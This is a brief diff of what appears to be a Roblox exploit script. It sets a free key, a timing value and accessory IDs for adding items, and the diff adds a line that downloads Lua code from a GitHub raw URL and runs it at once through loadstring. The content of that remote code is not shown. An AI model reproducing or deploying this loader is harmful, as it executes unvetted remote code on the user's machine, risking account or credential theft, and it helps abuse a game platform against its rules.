@@ -2,3 +2,5 @@ getgenv().DarvkFreeKey = "Free123!"
 
 getgenv().Time = 1 -- Adjust the time waited before adding the items
 getgenv().Hats = {"15569073358"} -- Add more head accessory IDs
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cxltures/zig/refs/heads/main/API%20(Free))')))()
